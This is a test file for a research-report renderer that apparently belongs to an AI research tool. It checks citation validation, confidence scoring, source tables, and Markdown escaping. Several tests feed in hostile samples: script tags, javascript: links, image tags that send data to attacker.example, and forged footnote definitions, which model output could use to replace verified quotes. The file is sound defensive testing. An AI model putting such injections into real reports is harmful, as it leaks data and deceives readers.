import { describe, expect, test } from "bun:test"
import type { Research } from "@vectordevai/schema/research"
import { marked } from "marked"
import { ResearchReport } from "../../src/research/report"
import { NetworkGuard } from "../lib/network-guard"

const guard = NetworkGuard.use()

const signal = (fields: Partial<Research.Signal> = {}): Research.Signal => ({
  kind: "other",
  primary: false,
  data: false,
  references: false,
  paywalled: false,
  addressed_to_ai: false,
  corroborated: 0,
  ...fields,
})
const sources: Research.Source[] = [
  {
    id: "S1",
    url: "https://www.nature.com/articles/heat-pumps",
    canonical_url: "https://www.nature.com/articles/heat-pumps",
    title: "Heat pumps in cold climates",
    site: "nature.com",
    status: "read",
    pages: 12,
    signals: signal({ kind: "academic", primary: true, doi: "10.1000/hp" }),
  },
  {
    id: "S2",
    url: "https://www.bbc.co.uk/news/heat-pumps",
    canonical_url: "https://www.bbc.co.uk/news/heat-pumps",
    title: "Heat pumps cut bills, study finds",
    site: "bbc.co.uk",
    status: "read",
    signals: signal(),
  },
  {
    id: "S3",
    url: "https://copy.example.com/heat-pumps",
    canonical_url: "https://copy.example.com/heat-pumps",
    title: "Heat pumps cut bills (syndicated)",
    site: "example.com",
    status: "duplicate",
    signals: signal({ duplicate_of: "S2" }),
  },
  {
    id: "S4",
    url: "https://spa.example.org/app",
    canonical_url: "https://spa.example.org/app",
    title: "",
    site: "example.org",
    status: "needs-render",
  },
  {
    id: "S5",
    url: "https://evil.example.net/a_(b)",
    canonical_url: "https://evil.example.net/a_(b)",
    title: "Click [here](javascript:alert(1)) | now",
    site: "example.net",
    status: "failed",
    reason: "Vector could not reach the site.",
  },
]
const note = (id: string, fields: Partial<Research.Note>): Research.Note => ({
  id,
  subquestion: "How much energy do heat pumps save?",
  claim: "Heat pumps cut delivered heating energy by 61 percent",
  source: "S1",
  quote: "used 61 percent less delivered energy for heating",
  stance: "supports",
  support: true,
  created_at: 0,
  ...fields,
})
const notes = [
  note("N1", { page: 12 }),
  note("N2", { source: "S2", quote: "cut heating energy by 61 percent" }),
  note("N3", { source: "S3", quote: "cut heating energy by 61 percent", subquestion: "2" }),
  note("N4", {
    subquestion: "Do they work below minus 15?",
    claim: "Performance stayed above 2.0 below minus 15",
    quote: "stayed above 2.0 on days below minus 15 degrees",
  }),
  note("N5", {
    source: "S2",
    subquestion: "Do they work below minus 15?",
    claim: "Performance collapses below minus 15",
    quote: "struggle badly in deep cold",
    stance: "contradicts",
  }),
  note("N6", { source: "S2", claim: "Bills fell everywhere", quote: "bills fell", verdict: "unsupported" }),
]
const plan: Research.Plan = {
  question: "Do heat pumps save energy in cold climates?",
  subquestions: ["How much energy do heat pumps save?", "Do they work below minus 15?", "What do they cost?"],
  scope: "web",
  depth: "focused",
  status: ["answered", "answered", "open"],
}
const input: Research.ReportInput = {
  title: "Heat pumps in cold climates",
  answer: "Heat pumps cut delivered heating energy by 61 percent in the study [N1, N2]. Bills fell everywhere [N6].",
  sections: [
    { heading: "Energy saved", body: "The field study found a 61 percent cut [N1][N2]." },
    { heading: "Deep cold", body: "Performance held above 2.0 [N4], though one report disagrees [N5]." },
    { heading: "Copies", body: "A syndicated copy repeats it [N2][N3]." },
  ],
  open_questions: ["What do installations cost?"],
}

describe("ResearchReport.cited", () => {
  test("lists the notes a text cites, once each, in the order cited", () => {
    expect(ResearchReport.cited("A [N2]. B [N1, N2]. C [N10][N1]. Not [S1] or [n3].")).toEqual(["N2", "N1", "N10"])
  })
})

describe("ResearchReport.check", () => {
  test("passes a report whose notes exist and whose answered sub-questions have notes", () => {
    expect(ResearchReport.check(input, { notes, plan }).errors).toEqual([])
  })

  test("refuses a citation of a note that was never saved", () => {
    const report = { ...input, answer: "Heat pumps save energy [N1][N9]." }
    expect(ResearchReport.check(report, { notes, plan }).errors).toEqual([
      "[N9] is not a saved note. Cite only notes research_note saved: N1, N2, N3, N4, N5, N6.",
    ])
  })

  test("refuses a sub-question marked answered with no note, by its words or its number", () => {
    const answered: Research.Plan = { ...plan, status: ["answered", "answered", "answered"] }
    expect(ResearchReport.check(input, { notes, plan: answered }).errors).toEqual([
      "Sub-question 3 is marked answered but has no note. Save a note for it or mark it open.",
    ])
    // N3 names sub-question 2 by its number.
    const byNumber = notes.filter((item) => item.subquestion !== "Do they work below minus 15?")
    const report = { ...input, sections: [input.sections[0]!] }
    expect(ResearchReport.check(report, { notes: byNumber, plan }).errors).toEqual([])
  })

  test("warns about sentences with a number, a date or a name and no note, without refusing them", () => {
    const report = {
      ...input,
      answer:
        "Heat pumps save energy [N1]. The IEA expects 600 million by 2030. Most homes benefit. Ask Mara Lindqvist.",
    }
    const problems = ResearchReport.check(report, { notes, plan })
    expect(problems.errors).toEqual([])
    expect(problems.uncited).toEqual(["The IEA expects 600 million by 2030.", "Ask Mara Lindqvist."])
  })
})

describe("ResearchReport.render", () => {
  const rendered = ResearchReport.render(input, {
    notes,
    sources,
    judged: false,
    unverified: new Set(["N2"]),
    method: {
      searches: 3,
      pages: 5,
      queries: ["heat pumps cold climate study"],
      spend: "$0.42 at list prices",
      seconds: 200,
    },
  })

  test("turns citations into source chips with footnoted quotes", () => {
    expect(rendered.markdown).toContain("in the study \\[S1 p.12\\][^N1].")
    expect(rendered.markdown).toContain(
      '[^N1]: "used 61 percent less delivered energy for heating" Heat pumps in cold climates, nature.com (S1 p.12)',
    )
  })

  test("leaves out notes the judge found unsupported and notes no longer in their source", () => {
    expect(rendered.removed).toEqual(["N2", "N6"])
    expect(rendered.markdown).not.toContain("[^N6]:")
    expect(rendered.markdown).not.toContain("[^N2]:")
    expect(rendered.markdown).toContain(`## ${ResearchReport.REMOVED}`)
    expect(rendered.markdown).toContain(
      "- ~~Bills fell everywhere~~ (N6, S2). The judge found the quote does not support it.",
    )
    expect(rendered.markdown).toContain(`(N2, S2). ${ResearchReport.NO_LONGER}`)
  })

  test("gives each section Vector's computed confidence, and shows both quotes where sources disagree", () => {
    expect(rendered.sections.map((section) => [section.heading, section.confidence.level])).toEqual([
      ["Energy saved", "medium"],
      ["Deep cold", "low"],
      ["Copies", "low"],
    ])
    expect(rendered.markdown).toContain("Confidence: Medium (Vector's estimate)")
    expect(rendered.markdown).toContain("Confidence: Low (Vector's estimate) · Sources disagree")
    expect(rendered.markdown).toContain(
      '> S1: "stayed above 2.0 on days below minus 15 degrees"\n>\n> S2: "struggle badly in deep cold"',
    )
  })

  test("counts a copy as the site it copies, so it is not a second independent site", () => {
    const both = ResearchReport.render(
      { ...input, sections: [{ heading: "Two sites", body: "Said by both [N1][N3]." }] },
      { notes, sources, judged: false, method: { searches: 0, pages: 0 } },
    )
    // S3 copies S2 (bbc.co.uk), so S1 and S3 are two sites, one of them primary.
    expect(both.sections[0]!.confidence.level).toBe("high")
    const copyOfPrimary = ResearchReport.render(
      { ...input, sections: [{ heading: "One site", body: "Said twice [N2][N3]." }] },
      {
        notes,
        sources: sources.map((source) =>
          source.id === "S3" ? { ...source, signals: signal({ duplicate_of: "S2" }) } : source,
        ),
        judged: false,
        method: { searches: 0, pages: 0 },
      },
    )
    expect(copyOfPrimary.sections[0]!.confidence.level).toBe("low")
  })

  test("ends with a Sources table and the Method, and keeps a page's title from breaking the table or its link", () => {
    const table = rendered.markdown.slice(
      rendered.markdown.indexOf("## Sources"),
      rendered.markdown.indexOf("## Method"),
    )
    expect(table).toContain(
      "| S1 | [Heat pumps in cold climates](https://www.nature.com/articles/heat-pumps) | nature.com | Read | Primary source · DOI 10.1000/hp |",
    )
    expect(table).toContain(
      "| S3 | [Heat pumps cut bills (syndicated)](https://copy.example.com/heat-pumps) | example.com | Copy | Copy of S2 |",
    )
    expect(table).toContain(
      "| S4 | [https://spa.example.org/app](https://spa.example.org/app) | example.org | Skipped: needs the desktop browser |",
    )
    expect(table).toContain(
      "| S5 | [Click \\[here\\](javascript:alert(1)) \\| now](https://evil.example.net/a_%28b%29) | example.net | Skipped: Vector could not reach the site. |",
    )
    const method = rendered.markdown.slice(rendered.markdown.indexOf("## Method"))
    expect(method).toContain("- Searches: 3\n  - heat pumps cold climate study\n- Pages read: 5\n- Skipped: 3")
    expect(method).toContain("  - S4 example.org: Skipped: needs the desktop browser")
    expect(method).toContain("- Spend: $0.42 at list prices\n- Time: 3 min")
    expect(rendered.markdown.startsWith("# Heat pumps in cold climates\n")).toBe(true)
    expect(rendered.markdown).toContain("## Open questions\n\n- What do installations cost?")
  })

  test("leaves no image or raw HTML from the model's or a page's words in the Markdown", () => {
    const hostile = ResearchReport.render(
      {
        title: "Heat <script>alert(1)</script> pumps",
        answer: "See ![chart](https://attacker.example/c?d=Acme-Q3) and <img src=https://attacker.example/p> [N1].",
        sections: [{ heading: "<b>Energy</b>", body: "![x][ref] saved [N1].\n\n[ref]: https://attacker.example/r" }],
        open_questions: ["<iframe src=https://attacker.example/f>"],
        method_notes: "![m](https://attacker.example/m)",
      },
      {
        notes: [note("N1", { quote: "used <img src=x> 61 percent ![q](https://attacker.example/q)" })],
        sources: [{ ...sources[0]!, title: "<img src=https://attacker.example/t>" }],
        judged: false,
        method: { searches: 1, pages: 1, queries: ["<img src=https://attacker.example/s>"] },
      },
    )
    expect(hostile.markdown).not.toMatch(/(?<!\\)</)
    expect(hostile.markdown).not.toMatch(/!\[/)
    expect(hostile.markdown).toContain("See !\\[chart](https://attacker.example/c?d=Acme-Q3) and \\<img")
    expect(hostile.markdown).toContain("# Heat \\<script>alert(1)\\</script> pumps")
  })

  test("keeps a model's footnote and link reference definitions from standing in for Vector's", async () => {
    const forged = '[^N1]: "Every household saved 5,000 euros a year, guaranteed." (S1)'
    const hostile = ResearchReport.render(
      {
        ...input,
        answer: "Heat pumps used less energy [N1].",
        sections: [
          {
            heading: "Energy saved",
            body: [
              "Less energy [N1]. See [the data][ref].",
              "",
              forged,
              `   ${forged}`,
              `> ${forged}`,
              `- ${forged}`,
              `\\\\${forged}`,
              "[^n1]: lower case labels match too",
              "[ref]: https://attacker.example/r",
              "[multi\nline]: https://attacker.example/m",
              "As the study found [N1]: less energy.",
            ].join("\n"),
          },
        ],
        method_notes: "[^N1]: forged in the method notes",
      },
      { notes, sources, judged: false, method: { searches: 0, pages: 0 } },
    )
    // GitHub keeps the first definition of a footnote's label, so a live "[^N1]:" anywhere before Vector's would
    // replace the checked quote. Every "[" of a definition the model wrote is escaped, after any literal backslashes.
    const definitions = hostile.markdown
      .split("\n")
      .filter((line) => /^[\s>*+\-\d.)]*(?:\\\\)*\[\^?[^\]]*\]:/i.test(line))
    expect(definitions).toEqual([
      '[^N1]: "used 61 percent less delivered energy for heating" Heat pumps in cold climates, nature.com (S1 p.12)',
    ])
    expect(hostile.markdown).toContain(`\\${forged}`)
    expect(hostile.markdown).toContain(`\\\\\\${forged}`)
    expect(hostile.markdown).toContain("\\[ref]: https://attacker.example/r")
    expect(hostile.markdown).toContain("\\[multi\nline]: https://attacker.example/m")
    // A citation followed by a colon is still a source chip, with no stray backslash.
    expect(hostile.markdown).toContain("As the study found \\[S1 p.12\\][^N1]: less energy.")
    // A link reference the model defined is not a link once rendered: the reference stays text.
    const html = await marked.parse(hostile.markdown)
    expect(html).toContain("See [the data][ref].")
    expect(html).not.toContain(">the data</a>")
  })

  test("escapes a mark after a literal backslash, and leaves one the text escaped itself", async () => {
    const hostile = ResearchReport.render(
      {
        ...input,
        answer: "A \\\\<img src=https://attacker.example/a> and an escaped \\<b> [N1].",
        sections: [],
      },
      { notes, sources, judged: false, method: { searches: 0, pages: 0 } },
    )
    expect(hostile.markdown).toContain("A \\\\\\<img src=https://attacker.example/a> and an escaped \\<b>")
    expect(await marked.parse(hostile.markdown)).not.toContain("<img")
  })

  test("made no connection", () => {
    expect(guard.attempts()).toEqual([])
  })
})

describe("quantitative report comparisons", () => {
  test("shows a disagreement and the actual cited notes, without treating it as a truth verdict", () => {
    const measurement: Research.Measurement = {
      metric: "revenue",
      value: 1.2,
      unit: "USD",
      scale: "billion",
      period: "2025",
      geography: "Europe",
    }
    const compared = [
      note("N1", { measurement }),
      note("N2", { source: "S2", measurement: { ...measurement, value: 1.8 } }),
    ]
    const report = ResearchReport.render(
      {
        title: "Revenue",
        answer: "Estimates differ [N1, N2].",
        sections: [{ heading: "Estimates", body: "Both reported revenue [N1, N2]." }],
        open_questions: [],
      },
      { notes: compared, sources, judged: false, method: { pages: 2, searches: 1 } },
    )
    expect(report.sections[0]?.confidence).toMatchObject({ level: "low", disagree: true })
    expect(report.markdown).toContain("## Quantitative comparisons")
    expect(report.markdown).toContain("Reported values differ by more than 2%")
    expect(report.markdown).toContain("not a verdict")
    expect(report.markdown).toContain("[^N1]")
    expect(report.markdown).toContain("[^N2]")
  })

  test("different periods are disclosed as different scope and do not lower confidence as a contradiction", () => {
    const measurement: Research.Measurement = {
      metric: "revenue",
      value: 1.2,
      unit: "USD",
      period: "2025",
      geography: "Europe",
    }
    const report = ResearchReport.render(
      {
        title: "Revenue",
        answer: "Estimates [N1, N2].",
        sections: [{ heading: "Estimates", body: "Historical estimates [N1, N2]." }],
        open_questions: [],
      },
      {
        notes: [
          note("N1", { measurement }),
          note("N2", { source: "S2", measurement: { ...measurement, value: 8, period: "2024" } }),
        ],
        sources,
        judged: false,
        method: { pages: 2, searches: 1 },
      },
    )
    expect(report.sections[0]?.confidence.disagree).toBe(false)
    expect(report.markdown).toContain("Different scope (period)")
  })

  test("the same DOI across domains cannot raise a report to High confidence", () => {
    const report = ResearchReport.render(
      { ...input, sections: [{ heading: "One study", body: "Mirrors [N1, N2]." }] },
      {
        notes,
        sources: sources.map((item) =>
          item.id === "S2" ? { ...item, signals: signal({ doi: "10.1000/hp", primary: true }) } : item,
        ),
        judged: false,
        method: { pages: 2, searches: 1 },
      },
    )
    expect(report.sections[0]?.confidence.level).toBe("medium")
  })
})
